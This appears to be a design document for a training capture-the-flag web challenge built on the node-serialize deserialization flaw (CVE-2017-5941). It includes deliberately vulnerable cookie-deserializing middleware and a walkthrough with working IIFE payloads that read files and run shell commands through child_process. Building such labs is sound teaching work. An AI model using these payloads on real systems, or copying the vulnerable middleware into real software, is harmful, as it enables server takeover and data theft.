# CTF7 NorthSide Notes -- Workflow Document

This document is the complete design and implementation reference for CTF7. It contains everything a developer needs to build the challenge from scratch: narrative text, exploit walkthroughs, infrastructure specifications, flag generation logic, breadcrumb design, unintended-vulnerability mitigations, and testing procedures. No application code should be written without consulting this document first.

---

## 1. Challenge Overview

NorthSide Notes is a single-flag, basic-difficulty jeopardy CTF built around Insecure Deserialization, classified as OWASP A08:2021 (Software and Data Integrity Failures) with secondary relevance to A06:2021 (Vulnerable and Outdated Components). The vulnerability exploits CVE-2017-5941 in the npm package `node-serialize@0.0.4`.

Players encounter a nostalgic, abandoned noute-taking web application ("NorthSide Notes") running on a forgotten corporate intranet box. The app uses `node-serialize` to deserialise a Base64-encoded profile cookie on every request. By crafting a malicious cookie containing an Immediately Invoked Function Expression (IIFE) using the `_$$ND_FUNC$$_` prefix, the player achieves arbitrary code execution on the server and reads their per-user flag file.

This is a basic-tier challenge, comparable in difficulty to CTF1 (cookie tampering). It requires knowledge of cookie manipulation (similar to CTF1) plus the additional step of researching the CVE and crafting a deserialization payload.

**Difficulty:** Basic
**Vulnerability class:** Insecure Deserialization (OWASP A08:2021), Vulnerable Components (OWASP A06:2021)
**CVE:** CVE-2017-5941
**Flag count:** 1
**Flag format:** `durham-ds{<16-hex-token>_<username>}`
**Tech stack:** Node.js 18, Express 4, EJS, node-serialize@0.0.4, cookie-parser
**Port:** 3001 (host) mapped to 3001 (container)

### Learning Objectives

- Understanding insecure deserialization and its impact on application security
- Identifying vulnerable dependencies via exposed package metadata
- Researching known CVEs and translating them into working exploits
- Crafting IIFE payloads for the `node-serialize` deserialization vulnerability
- Understanding the risks of abandoned, unmaintained software in production environments

---

## 2. Narrative Script

All story text is collected here. Each entry is labelled with its location in the application. A developer can change any of these strings without affecting exploit logic, provided the following rules are observed:

- The `profile` cookie name must not change.
- The `/debug` endpoint path must not change.
- The `/home` route path must not change.
- The `_engine` field name in the debug response must not change.
- The `node-serialize` package name and version must not change.
- The flag file path pattern (`src/data/flag-files/<username>.txt`) must not change.

Everything else (application name, tagline, note content, about-page text, footer text, page titles) is safe to modify.

### 2.1 Application Identity

**Application name:** NorthSide Notes
**Tagline:** "A nostalgic self-hosted note-taking app, built in 2017, still going strong."
**Scenario:** A small independent developer shipped a personal journal app years ago and abandoned maintenance. It now runs untouched on a forgotten corporate intranet box. The player is auditing this neglected service.

### 2.2 Login Page (`src/views/index.ejs`)

```
NorthSide Notes

A nostalgic self-hosted note-taking app, built in 2017, still going strong.

Log in to access your notes.
```

**HTML comment (Chain A breadcrumb):**
```html
<!-- legacy profile format: handled by node-serialize, see /package.json -->
```

### 2.3 Home Page (`src/views/home.ejs`)

```
Welcome back, <%= userProfile.username %>

Your Notes
[list of notes from notes.json]
```

The `<%= userProfile.username %>` is the injection point. When the deserialized IIFE returns the flag string, it appears where the username would normally be rendered.

### 2.4 About Page (`src/views/about.ejs`)

```
About NorthSide Notes

Version: 1.0.0 (released 2017)
Built with Express and EJS.
Last updated: never. If it works, do not touch it.

NorthSide Notes was created as a personal journaling tool by a solo developer
who has long since moved on. The application continues to run on legacy
infrastructure, maintained by no one.
```

### 2.5 Seeded Notes (`src/data/notes.json`)

```json
[
  {
    "id": 1,
    "title": "Welcome to NorthSide Notes",
    "body": "This is your personal note-taking space. Create, read, and organise your thoughts. This app has been running since 2017 and we have no plans to change anything."
  },
  {
    "id": 2,
    "title": "Maintenance Log",
    "body": "2017-06-15: Initial deployment. All dependencies pinned. 2018-01-02: Server migrated to new box. No code changes. 2019-04-20: 'npm audit' reports 3 vulnerabilities. Ignoring for now; everything still works."
  },
  {
    "id": 3,
    "title": "Internal Reminder",
    "body": "The profile cookie uses node-serialize to store session data. This library supports serialising JavaScript functions as part of the profile object. Functions are reconstructed and executed server-side when the profile is loaded on each request. Do not modify the serialisation format without a full migration plan."
  }
]
```

### 2.6 Footer Partial (`src/views/partials/footer.ejs`)

```html
<footer>
  <p>NorthSide Notes v1.0.0</p>
  <p style="color: #999; font-size: 0.75em;">
    <a href="/about">About</a> |
    <a href="/CHANGELOG.md" style="color: #ccc;">Changelog</a> |
    <a href="/debug" style="color: #ccc;">Internal Tools</a>
  </p>
</footer>
```

The "Changelog" and "Internal Tools" links are deliberately styled in light grey. The Changelog link leads to `public/CHANGELOG.md`, which names node-serialize and mentions function support (Chain B2). The "Internal Tools" link leads to `/debug` (Chain B entry point).

### 2.7 Flag Red Herring Page (`src/views/flag.ejs`)

```
Nothing here yet.

This page is under construction. Check back later.
```

### 2.8 Forbidden Page (`src/views/forbidden.ejs`)

```
Access Denied

You do not have permission to view this page.
```

### 2.9 Lockout Page (`src/views/lockout.ejs`)

```
Too Many Attempts

You have been temporarily locked out due to too many failed login attempts.
Please try again in <%= retrySec %> seconds.
```

### 2.10 Debug Endpoint Response (`GET /debug`)

**JSON response (default, every visit):**
```json
{
  "note": "Debug endpoint. Shows your parsed profile cookie.",
  "profile": { "username": "abcd12", "theme": "light", "lastVisit": "2026-04-16T12:00:00.000Z" },
  "_engine": "node-serialize@0.0.4",
  "_engineNote": "Profile data is deserialized server-side on every page load using this engine.",
  "_appRoot": "/app"
}
```

`_appRoot` exposes `process.cwd()`. Players can derive the flag file path as `<_appRoot>/src/data/flag-files/<username>.txt` without needing prior knowledge of the container layout.

**JSON response (after 2+ visits, additional field):**
```json
{
  "note": "Debug endpoint. Shows your parsed profile cookie.",
  "profile": { "username": "abcd12", "theme": "light", "lastVisit": "2026-04-16T12:00:00.000Z" },
  "_engine": "node-serialize@0.0.4",
  "_engineNote": "Profile data is deserialized server-side on every page load using this engine.",
  "_appRoot": "/app",
  "_hint": "CVE-2017-5941: functions embedded in serialized data are reconstructed and immediately executed on deserialization. See https://www.npmjs.com/package/node-serialize"
}
```

The `_hint` leads with the execution behaviour (reconstructed and immediately executed) rather than just the CVE name, directly bridging the gap to IIFE payload construction.

---

## 3. Exploit Walkthrough

### Prerequisite: Login

**Credentials:** Generated per-user via the challenge generation system. See `src/data/users.json` for usernames and passwords (all passwords are randomly generated hex strings).

1. Navigate to `http://localhost:3001/`.
2. Enter a username and password from `users.json`.
3. On successful login, the app sets a `profile` cookie and redirects to `/home`.

### Step 1: Inspect the Profile Cookie

After logging in, open Developer Tools:

1. Go to Application (Chrome) or Storage (Firefox) > Cookies > `http://localhost:3001`
2. Locate the cookie named `profile`
3. The value is a Base64-encoded string

Decode it in the browser console:

```js
atob(document.cookie.split('profile=')[1])
```

You should see JSON like:

```json
{"username":"abcd12","theme":"light","lastVisit":"2026-04-16T12:00:00.000Z"}
```

### Step 2: Discover the Vulnerable Library

Three independent discovery chains lead to the same conclusion. Any one is sufficient.

**Chain A: HTML comment**

View the page source of `http://localhost:3001/` (login) or `http://localhost:3001/home` (dashboard). Find:

```html
<!-- legacy profile format: handled by node-serialize, see /package.json -->
```

This directly names the library and points to the exposed `package.json`.

**Chain B: /debug endpoint**

1. Notice the greyed-out "Internal Tools" link in the footer.
2. Visit `http://localhost:3001/debug`.
3. The JSON response contains `"_engine": "node-serialize@0.0.4"` and `"_engineNote": "Profile data is deserialized server-side on every page load using this engine."`.
4. After 2 visits, an additional `_hint` field appears pointing to the npm page and CVE.

**Chain B2: /CHANGELOG.md**

1. Click the "Changelog" link in the footer, or navigate to `http://localhost:3001/CHANGELOG.md`.
2. The file contains: `[INFRA] Profile cookie uses node-serialize for session data persistence. Supports complex data types including JavaScript functions.`
3. This names the library, confirms it handles functions, and points to `/package.json`.

**Chain C: Exposed package.json**

1. Navigate directly to `http://localhost:3001/package.json`.
2. The file is served as static content and lists `"node-serialize": "0.0.4"` in the dependencies.

### Step 3: Research the Vulnerability

Search for "node-serialize CVE-2017-5941" or "node-serialize deserialization vulnerability". Key findings:

- `node-serialize@0.0.4` uses `eval()` internally when it encounters the marker `_$$ND_FUNC$$_` in serialized data
- A function string prefixed with `_$$ND_FUNC$$_` and wrapped as an IIFE `(function(){...}())` will be executed during `unserialize()`
- This allows arbitrary code execution on the server

### Step 4: Craft the Payload

The profile cookie is deserialized on every request to `/home`. The `username` field's value is rendered into the page via `<%= userProfile.username %>`. If the deserialized IIFE returns a string, that string replaces the username.

The payload reads the player's per-user flag file. The flag files are stored at `/app/src/data/flag-files/<username>.txt` inside the container.

**Payload object (before Base64 encoding):**

```json
{"username":"_$$ND_FUNC$$_function(){var f=require('fs');return f.readFileSync('/app/src/data/flag-files/abcd12.txt','utf8').trim()}()","theme":"light","lastVisit":"2026-04-16T00:00:00.000Z"}
```

Replace `abcd12` with your own username.

**Base64 encode in the browser console:**

```js
btoa(JSON.stringify({
  "username": "_$$ND_FUNC$$_function(){var f=require('fs');return f.readFileSync('/app/src/data/flag-files/abcd12.txt','utf8').trim()}()",
  "theme": "light",
  "lastVisit": "2026-04-16T00:00:00.000Z"
}))
```

**Or via a Node.js helper script:**

```js
const payload = {
  username: "_$$ND_FUNC$$_function(){var f=require('fs');return f.readFileSync('/app/src/data/flag-files/abcd12.txt','utf8').trim()}()",
  theme: "light",
  lastVisit: new Date().toISOString()
};
console.log(Buffer.from(JSON.stringify(payload)).toString('base64'));
```

### Step 5: Replace the Cookie and Retrieve the Flag

1. In the browser's cookie editor, replace the `profile` cookie value with the Base64 string from Step 4.
2. Navigate to `http://localhost:3001/home`.
3. The page renders "Welcome back, durham-ds{...}" where the username would normally appear.

**Flag:** `durham-ds{<16-hex-token>_<username>}`

### Alternative: Generalised RCE

The same technique supports arbitrary code execution beyond reading a specific file:

```json
{"username":"_$$ND_FUNC$$_function(){return require('child_process').execSync('whoami').toString().trim()}()"}
```

This is the generalised form. The intended solution uses `fs.readFileSync` to read the flag file, but players who achieve RCE via `child_process` or other means should also receive credit.

---

## 4. Infrastructure Diagram

```
                       HOST MACHINE
+------------------------------------------------------+
|                                                      |
|  Player Browser                                      |
|       |                                              |
|       | http://localhost:3001                         |
|       v                                              |
+------ | ---------------------------------------------+
        |
        | port 3001:3001
        |
+------ | --- Docker ---------------------------------+
|       v                                              |
|  +-----------+                                       |
|  |    app    |     Node.js 18 / Express 4            |
|  |           |     Port 3001                         |
|  |           |     EJS templates                     |
|  |           |     node-serialize@0.0.4              |
|  |           |                                       |
|  |  /src/data/                                       |
|  |    users.json      (credentials)                  |
|  |    flags.json      (username -> flag mapping)     |
|  |    notes.json      (seeded note content)          |
|  |    flag-files/     (per-user .txt files)          |
|  |      abcd12.txt                                   |
|  |      efgh34.txt                                   |
|  |      ijkl56.txt                                   |
|  +-----------+                                       |
|                                                      |
+------------------------------------------------------+

Legend:
- Single container, single service
- No database; flat JSON files for all data
- Flag files are inside the container at /app/src/data/flag-files/
- Flag files are NOT served by express.static
- express.static serves only /app/public/
```

---

## 5. Route Specification

| Method | Path | Auth Required | Purpose |
|--------|------|---------------|---------|
| GET | `/` | No | Login page (`index.ejs`) |
| POST | `/login` | No | Authenticate, set `profile` cookie, redirect to `/home` |
| GET | `/home` | Yes (profile cookie) | Notes dashboard; renders `userProfile.username` from deserialized cookie |
| GET | `/note/:id` | Yes (profile cookie) | Individual note view; strict numeric id guard (`/^\d+$/`) |
| GET | `/about` | No | Static about page with version info |
| GET | `/debug` | No | JSON response showing parsed profile cookie and `_engine` hint |
| GET | `/flag` | No | Red herring; returns "Nothing here yet" |
| GET | `/logout` | No | Clears `profile` cookie, redirects to `/` |
| GET | `/package.json` | No | Served via `express.static('public/')` (Chain C breadcrumb) |

### Route Details

**POST `/login`:**
1. Read `src/data/users.json`, find matching username.
2. Compare password (plaintext comparison; passwords are random hex strings).
3. On success: build profile object `{ username, theme: 'light', lastVisit: new Date().toISOString() }`.
4. Serialize with `serialize.serialize(profile)`, Base64-encode, set as `profile` cookie.
5. Cookie options: `httpOnly: false`, `path: '/'` (no domain, no secure, no sameSite).
6. Redirect to `/home` (302).
7. On failure: render `index.ejs` with error message, return 401.

**GET `/home`:**
1. `profileDeserializer` middleware has already parsed the `profile` cookie.
2. If `req.userProfile` is null or undefined, redirect to `/`.
3. Load notes from `src/data/notes.json`.
4. Render `home.ejs` with `{ userProfile: req.userProfile, notes }`.

**GET `/note/:id`:**
1. Validate that `req.params.id` matches `/^\d+$/`. If not, return 400.
2. Load notes from `src/data/notes.json`.
3. Find note by id. If not found, return 404.
4. Render `note.ejs` with `{ note }`.

**GET `/debug`:**
1. Read `req.userProfile` (may be null if no cookie).
2. Track visit count using `attemptTracker` (keyed by cookie value or IP).
3. Build response object: `{ note, profile, _engine, _engineNote, _appRoot: process.cwd() }`.
4. If visit count >= 2, add `_hint` field (execution-focused CVE description).
5. Return JSON response (Content-Type: application/json).

**GET `/flag`:**
1. Render `flag.ejs` (the red herring page). Always returns 200.

---

## 6. Vulnerability Design Notes

### The Vulnerable Middleware (`src/middleware/profileDeserializer.js`)

This is the core of the challenge. The middleware runs on every request and deserialises the `profile` cookie using `node-serialize`:

```javascript
// This middleware is DELIBERATELY VULNERABLE. Do not refactor.
// It reproduces CVE-2017-5941 for educational purposes.
const serialize = require('node-serialize');

module.exports = function profileDeserializer(req, res, next) {
  if (req.cookies && req.cookies.profile) {
    try {
      const decoded = Buffer.from(req.cookies.profile, 'base64').toString('utf8');
      req.userProfile = serialize.unserialize(decoded);
    } catch (err) {
      req.userProfile = null;
    }
  }
  next();
};
```

**Why this works:** `node-serialize@0.0.4` checks for the `_$$ND_FUNC$$_` prefix during deserialization. When it finds this prefix, it passes the function string to `eval()`. If the function string is an IIFE (ends with `()`), it executes immediately during `unserialize()` and the return value replaces the property value in the resulting object.

**Only `/home` triggers the visible exploit:** Although the middleware runs globally, only `/home` renders `req.userProfile.username` into the page. Other routes do not display the deserialized data to the user (except `/debug`, which shows the parsed profile as JSON).

### Cookie Format

The `profile` cookie contains: `Base64(JSON.stringify(serialize.serialize(profileObject)))`.

In practice, for a normal login, `serialize.serialize()` produces a plain JSON string (no `_$$ND_FUNC$$_` markers) because the profile object contains only simple values. The Base64 decoding of a normal cookie yields:

```json
{"username":"abcd12","theme":"light","lastVisit":"2026-04-16T12:00:00.000Z"}
```

---

## 7. Breadcrumb Design

Four independent discovery chains point to the vulnerable library. Each is sufficient on its own; a thorough player may find all of them.

### Chain A: HTML Comment

**Location:** `src/views/index.ejs` (login page) and `src/views/home.ejs` (dashboard)
**Content:** `<!-- legacy profile format: handled by node-serialize, see /package.json -->`
**What it reveals:** The library name (`node-serialize`) and the fact that `package.json` is exposed.
**Difficulty to find:** Requires viewing page source on either the login page or the home dashboard.

### Chain B: /debug Endpoint

**Location:** Linked from footer in light grey ("Internal Tools")
**Content:** JSON response with `"_engine"`, `"_engineNote"`, and `"_appRoot": process.cwd()` on every visit.
**Escalation:** After 2 visits, adds `"_hint"` that leads with: "functions embedded in serialized data are reconstructed and immediately executed on deserialization."
**What it reveals:** The library name, version, the fact that deserialization runs on every page load, the container working directory (for flag file path derivation), and quickly the execution-focused CVE description.
**Difficulty to find:** Requires noticing the subtle footer link.

### Chain B2: /CHANGELOG.md

**Location:** `public/CHANGELOG.md`, linked from footer in light grey ("Changelog")
**Content:** `[INFRA] Profile cookie uses node-serialize for session data persistence. Supports complex data types including JavaScript functions. See /package.json for the pinned version.`
**What it reveals:** The library name, that it handles JavaScript functions (key to the exploit), and the location of the pinned version.
**Difficulty to find:** Click the footer link, or navigate directly. No view-source required.

### Chain C: Exposed package.json

**Location:** `http://localhost:3001/package.json`
**Content:** Full `package.json` with `"node-serialize": "0.0.4"` in dependencies.
**What it reveals:** The dependency and its pinned version.
**Difficulty to find:** Requires following the hint from Chain A, B2, or trying common file paths as part of reconnaissance.
**Implementation:** Copy `package.json` from the project root into `public/package.json` at server startup (not a symlink, for Docker portability). `express.static('public/')` serves it at the root path.

---

## 8. Unintended Vulnerability Audit

This section enumerates unintended vulnerability candidates that were considered during design and how each is mitigated. This ensures the deserialization exploit remains the only viable path to the flag.

### V1: Path Traversal on `/note/:id`

**Risk:** A player could attempt `/note/../data/flag-files/abcd12.txt` or similar traversal to read flag files via the notes route.
**Mitigation:** The route handler rejects any `:id` parameter that does not match the strict regex `/^\d+$/`. Only numeric IDs are accepted. Any non-numeric input returns 400 immediately.

### V2: Flag Files Reachable via `express.static`

**Risk:** If `express.static` serves the `src/data/` directory (or a parent of it), flag files could be downloaded directly via HTTP.
**Mitigation:** `express.static` serves only the `public/` directory, which is completely separate from `src/data/`. The `flag-files/` directory is inside `src/data/` and is not reachable via any static route. Verify by confirming that `http://localhost:3001/data/flag-files/abcd12.txt` returns 404.

### V3: Brute-Force Login

**Risk:** Without rate limiting, an attacker could brute-force passwords (though they are random hex strings, making this impractical).
**Mitigation:** `loginRateLimiter` middleware (mirroring CTF1's pattern) limits login attempts to 5 per 2-minute sliding window per IP. After exceeding the limit, the IP is locked out for 5 minutes. The lockout page renders with a countdown timer.

### V4: Direct `/flag` Route Bypass

**Risk:** A player might assume `/flag` is the flag endpoint (as in CTF1) and attempt authentication bypass.
**Mitigation:** The `/flag` route is a deliberate red herring. It returns a static page saying "Nothing here yet" with no authentication check and no flag data. This wastes time for players who assume the same pattern as CTF1.

### V5: Cross-User Flag Capture via Manipulated Username in IIFE

**Risk:** The IIFE payload includes a hardcoded username to construct the flag file path. A player could read another player's flag file by changing the username in the payload.
**Discussion:** This is partially acceptable in a CTF context because:
  - Each player must still craft the IIFE payload (demonstrating the exploit skill).
  - The flag file path requires knowing another player's username.
  - In a controlled lab environment, players typically only know their own username.
  - Full mitigation would require server-side session validation tied to the flag file, which would complicate the challenge beyond its basic difficulty level.
**Status:** Accepted risk. Document in SOLUTIONS.md that cross-user flag reading is technically possible but does not undermine the learning objective.

### V6: Cookie Replay After Logout

**Risk:** After logout, a player could re-set the old `profile` cookie to regain access.
**Mitigation:** This is inherent to stateless cookie-based sessions and is not a meaningful exploit vector for this challenge. The `/logout` route clears the cookie, but there is no server-side session store to invalidate. This is acceptable because the deserialization exploit is the intended vulnerability, not session management.

### V7: Debug Endpoint Information Leak

**Risk:** The `/debug` endpoint reveals the parsed profile and the `_engine` field, which could be considered an unintended information disclosure.
**Discussion:** This is an intentional breadcrumb (Chain B), not an unintended vulnerability. The endpoint exists specifically to guide players toward the vulnerability. The `_engine` field is a designed hint, not a leak.

---

## 9. Flag System

### Generation

Flags are generated deterministically using HMAC-SHA256, identical to the pattern used by all other CTFs in the repository.

**Generator:** `CTFs/challenge-generation/generators/ctf7_generator.js`
- Salt: `'ctf7-default-salt'`
- Token length: 16 hex characters
- Algorithm: HMAC-SHA256 with salt as key, username as message
- Output: first 16 hex characters of the HMAC digest

**CLI:** `CTFs/challenge-generation/chgen_ctf7.js`
- Mirrors `chgen_basic1.js` in structure and argument handling
- Accepts explicit usernames or `--count N` for random generation
- Username format: 4 lowercase letters + 2 digits (regex: `/^[a-z]{4}[0-9]{2}$/`)
- Respects environment variables: `GENERATOR_NAME`, `GENERATOR_SALT`, `GENERATOR_TOKEN_LENGTH`

**Flag format:** `durham-ds{<16-hex-token>_<username>}`
**Flag prefix:** `durham-ds` (deserialization)

### Storage

Two storage locations, kept in sync:

1. **`src/data/flags.json`**: Flat JSON object mapping username to flag string.
   ```json
   {
     "abcd12": "durham-ds{a1b2c3d4e5f6g7h8_abcd12}",
     "efgh34": "durham-ds{i9j0k1l2m3n4o5p6_efgh34}",
     "ijkl56": "durham-ds{q7r8s9t0u1v2w3x4_ijkl56}"
   }
   ```

2. **`src/data/flag-files/<username>.txt`**: One file per user, containing only the flag string (no trailing newline beyond what the generator writes). These are the files read by the IIFE payload.
   ```
   abcd12.txt -> "durham-ds{a1b2c3d4e5f6g7h8_abcd12}"
   ```

### Flag Sync Service (`src/services/flagSync.js`)

At server startup, the flag sync service:
1. Reads `src/data/flags.json`.
2. Ensures `src/data/flag-files/` directory exists.
3. For each username/flag pair, writes (or overwrites) `src/data/flag-files/<username>.txt`.
4. Logs the number of flag files synchronised.

This mirrors the `syncFlagsToVaults()` pattern used in CTF2. It ensures that even if flag files are missing (e.g., after a volume reset), they are recreated from the authoritative `flags.json` on every container start.

### Credential Storage

**`src/data/users.json`**: Flat JSON object mapping username to credential object.
```json
{
  "abcd12": { "password": "a1b2c3d4e5", "role": "user" },
  "efgh34": { "password": "f6g7h8i9j0", "role": "user" },
  "ijkl56": { "password": "k1l2m3n4o5", "role": "user" }
}
```

Passwords are randomly generated hex strings (8-12 characters), matching the CTF1 convention. The `chgen_ctf7.js` script writes both `flags.json` and `users.json` (note: this CTF uses `users.json` rather than `credentials.json` to match the flat-file, no-database pattern; the generator writes to both filenames for compatibility).

---

## 10. Challenge Generation Integration

### Generator Module (`CTFs/challenge-generation/generators/ctf7_generator.js`)

```javascript
const crypto = require('crypto');

module.exports = function ctf7Generator(username, options = {}) {
  const salt = options.salt || 'ctf7-default-salt';
  const tokenLength = options.tokenLength || 16;
  const h = crypto.createHmac('sha256', String(salt))
    .update(String(username))
    .digest('hex');
  return h.slice(0, tokenLength);
};
```

### CLI Script (`CTFs/challenge-generation/chgen_ctf7.js`)

Mirrors `chgen_basic1.js` exactly in structure. Key differences:

- Uses `ctf7Generator` from `generators/ctf7_generator.js`
- Flag prefix: `durham-ds`
- Flag format: `durham-ds{${token}_${username}}`
- Output directory: `CTFs/CTF_7_notes_app/`
- Output files: `src/data/flags.json`, `src/data/users.json`
- Additional output: writes per-user flag files to `src/data/flag-files/<username>.txt`
- Creates the `flag-files/` directory if it does not exist

### npm Script Addition (`CTFs/challenge-generation/package.json`)

Add to the `scripts` section:
```json
"generate-flags-ctf7": "node chgen_ctf7.js"
```

Update the `generate-flags` master script to include CTF7:
```json
"generate-flags": "npm run generate-flags-basic1 && npm run generate-flags-ctf2 && npm run generate-flags-ctf3 && npm run generate-flags-ctf5 && npm run generate-flags-ctf6 && npm run generate-flags-ctf7"
```

### Usage

```bash
cd CTFs/challenge-generation

# Generate for specific users
node chgen_ctf7.js abcd12 efgh34 ijkl56

# Generate for N random users
node chgen_ctf7.js --count 10
```

---

## 11. Implementation Details

### Application Entry Point (`src/app.js`)

The Express app setup:

1. Require `express`, `cookie-parser`, `path`.
2. Configure EJS as the view engine, views directory as `src/views`.
3. Apply `cookie-parser` middleware globally.
4. Apply `profileDeserializer` middleware globally.
5. Serve `public/` via `express.static`.
6. Mount route modules: auth, home, notes, debug, about.
7. Run flag sync on startup (call `flagSync()`).
8. Copy `package.json` to `public/package.json` on startup (for Chain C).
9. Listen on `process.env.PORT || 3001`.

**Important:** No narrative strings in `app.js`. All text lives in EJS templates, `notes.json`, or `STORY.md`.

### Middleware

**`src/middleware/profileDeserializer.js`:**
See Section 6 for the exact implementation. Applied globally. The only code path that calls `serialize.unserialize()` on user input.

**`src/middleware/loginRateLimiter.js`:**
Mirror CTF1's implementation exactly:
- 5 failed attempts per 2-minute sliding window per IP
- 5-minute lockout after exceeding the limit
- In-memory storage (Map keyed by IP)
- Periodic cleanup (hourly, remove idle records older than 24 hours)
- Applied only to `POST /login`

### Services

**`src/services/flagSync.js`:**
Reads `flags.json`, writes per-user `.txt` files into `flag-files/`. Called once at server startup. Logs results to stdout.

**`src/services/flagService.js`:**
Utility to load flags from `flags.json`. Used by the flag sync service. Simple `JSON.parse(fs.readFileSync(...))` wrapper.

**`src/services/attemptTracker.js`:**
Mirror CTF1's implementation. Tracks visit counts keyed by cookie value or IP. Used by the `/debug` route to count visits and add the progressive hint after 2 visits.

### Views

All templates use EJS. Partials (`header.ejs`, `footer.ejs`) are shared across pages.

**`src/views/partials/header.ejs`:** HTML head, stylesheet link, page title.
**`src/views/partials/footer.ejs`:** Footer with version, about link, and subtle debug link.

### Static Assets

**`public/styles.css`:** Basic stylesheet. Can reuse CTF1's CSS with adjusted colours (muted, "retro" palette to match the abandoned app theme).
**`public/package.json`:** Copy of the root `package.json`, created at server startup. This is the Chain C breadcrumb.

---

## 12. Docker Configuration

### Dockerfile

```dockerfile
FROM node:18-alpine

WORKDIR /app

COPY package*.json ./
RUN npm ci --production

COPY . .

EXPOSE 3001

CMD ["node", "src/app.js"]
```

### docker-compose.yml

```yaml
version: "3.9"

services:
  app:
    build: .
    container_name: ctf7-notes-app
    ports:
      - "3001:3001"
    volumes:
      - ./src/data/flags.json:/app/src/data/flags.json:ro
      - ./src/data/users.json:/app/src/data/users.json:ro
      - ./src/data/notes.json:/app/src/data/notes.json:ro
      - flag-files:/app/src/data/flag-files
    restart: unless-stopped

volumes:
  flag-files:
```

**Notes:**
- `flags.json`, `users.json`, and `notes.json` are mounted read-only.
- `flag-files` uses a named volume so that the flag sync service can write per-user flag files at startup, and they persist across container restarts.
- No database service needed; all data is in flat JSON files.
- Port 3001 avoids conflict with CTF1 (port 3000).

### .dockerignore

```
node_modules
npm-debug.log
.git
.gitignore
test/
README.md
SOLUTIONS.md
STORY.md
workflow.md
```

---

## 13. Test Specification

Jest + supertest in `test/app.test.js`. Match CTF1's coverage level.

### Test Cases

1. **GET `/home` without profile cookie:** Should redirect to `/` (302) or return 302/401.

2. **GET `/home` with a normal profile cookie:** Should render the page with the username visible in the response body.

3. **GET `/home` with a malicious IIFE profile cookie:** Should render the flag in the response body where the username would normally be. This is the "happy path exploit works" test.
   - Construct a payload that reads a known flag file.
   - Base64 encode it.
   - Set it as the `profile` cookie.
   - Verify the response body contains `durham-ds{`.

4. **GET `/flag` (red herring):** Should return 200 with "Nothing here yet" or similar placeholder text.

5. **POST `/login` with wrong password:** Should return 401 or render the login page with an error message.

6. **GET `/note/:id` with non-numeric id:** Should return 400.

### E2E Test (`CTFs/e2e/ctf7_exploit.py`)

A Python pytest script matching the pattern of the other e2e exploit scripts. Key tests:

1. **test_login_and_cookie_set:** Login as a normal user, verify `profile` cookie is set.
2. **test_cookie_is_base64_json:** Decode the profile cookie, verify it contains `username`, `theme`, `lastVisit`.
3. **test_debug_endpoint_reveals_engine:** GET `/debug` with a valid cookie, verify `_engine` field contains `node-serialize@0.0.4`.
4. **test_package_json_exposed:** GET `/package.json`, verify it contains `node-serialize`.
5. **test_flag_red_herring:** GET `/flag`, verify it does not contain `durham-ds{`.
6. **test_full_exploit:** Craft IIFE payload, set as profile cookie, GET `/home`, verify response contains `durham-ds{`.

---

## 14. Deliverables Checklist

| # | Deliverable | Path | Status |
|---|-------------|------|--------|
| 1 | Directory structure | `CTFs/CTF_7_notes_app/` | |
| 2 | package.json with pinned node-serialize@0.0.4 | `CTFs/CTF_7_notes_app/package.json` | |
| 3 | Generator module | `CTFs/challenge-generation/generators/ctf7_generator.js` | |
| 4 | Generator CLI | `CTFs/challenge-generation/chgen_ctf7.js` | |
| 5 | npm script in challenge-generation | `CTFs/challenge-generation/package.json` | |
| 6 | Seed users.json | `CTFs/CTF_7_notes_app/src/data/users.json` | |
| 7 | Seed notes.json | `CTFs/CTF_7_notes_app/src/data/notes.json` | |
| 8 | Generated flags.json | `CTFs/CTF_7_notes_app/src/data/flags.json` | |
| 9 | Generated flag-files/ | `CTFs/CTF_7_notes_app/src/data/flag-files/*.txt` | |
| 10 | App entry point | `CTFs/CTF_7_notes_app/src/app.js` | |
| 11 | Deserialization middleware | `CTFs/CTF_7_notes_app/src/middleware/profileDeserializer.js` | |
| 12 | Login rate limiter | `CTFs/CTF_7_notes_app/src/middleware/loginRateLimiter.js` | |
| 13 | Auth routes | `CTFs/CTF_7_notes_app/src/routes/auth.js` | |
| 14 | Home route | `CTFs/CTF_7_notes_app/src/routes/home.js` | |
| 15 | Notes route | `CTFs/CTF_7_notes_app/src/routes/notes.js` | |
| 16 | Debug route | `CTFs/CTF_7_notes_app/src/routes/debug.js` | |
| 17 | About route | `CTFs/CTF_7_notes_app/src/routes/about.js` | |
| 18 | Flag sync service | `CTFs/CTF_7_notes_app/src/services/flagSync.js` | |
| 19 | Flag service | `CTFs/CTF_7_notes_app/src/services/flagService.js` | |
| 20 | Attempt tracker | `CTFs/CTF_7_notes_app/src/services/attemptTracker.js` | |
| 21 | EJS views (all) | `CTFs/CTF_7_notes_app/src/views/*.ejs` | |
| 22 | Partials | `CTFs/CTF_7_notes_app/src/views/partials/*.ejs` | |
| 23 | Stylesheet | `CTFs/CTF_7_notes_app/public/styles.css` | |
| 24 | Dockerfile | `CTFs/CTF_7_notes_app/Dockerfile` | |
| 25 | docker-compose.yml | `CTFs/CTF_7_notes_app/docker-compose.yml` | |
| 26 | .dockerignore | `CTFs/CTF_7_notes_app/.dockerignore` | |
| 27 | .gitignore | `CTFs/CTF_7_notes_app/.gitignore` | |
| 28 | Jest tests | `CTFs/CTF_7_notes_app/test/app.test.js` | |
| 29 | E2E exploit test | `CTFs/e2e/ctf7_exploit.py` | |
| 30 | README.md | `CTFs/CTF_7_notes_app/README.md` | |
| 31 | SOLUTIONS.md | `CTFs/CTF_7_notes_app/SOLUTIONS.md` | |
| 32 | STORY.md | `CTFs/CTF_7_notes_app/STORY.md` | |
| 33 | ctf-config.json | `CTFs/CTF_7_notes_app/ctf-config.json` | |
| 34 | challenge-generation README update | `CTFs/challenge-generation/README.md` | |
| 35 | Project CHANGELOG.md update | `CHANGELOG.md` | |

---

## 15. Order of Work

Implement in this order. Commit after each major step.

1. Create directory structure and `package.json` with pinned `node-serialize@0.0.4`.
2. Build the generator module and CLI in `CTFs/challenge-generation/`. Update `package.json` scripts and `README.md`.
3. Seed `users.json`, `notes.json`. Run the generator to produce `flags.json` and per-user flag files.
4. Implement `src/app.js`, the deserialization middleware, login and logout routes (`src/routes/auth.js`).
5. Implement `/home` (`src/routes/home.js`), `/note/:id` (`src/routes/notes.js`), `/about` (`src/routes/about.js`), `/flag` red herring (can be in `src/routes/about.js` or a separate file).
6. Implement `/debug` (`src/routes/debug.js`) and the `package.json` copy-to-public logic.
7. Add the rate limiter (`src/middleware/loginRateLimiter.js`) and attempt tracker (`src/services/attemptTracker.js`).
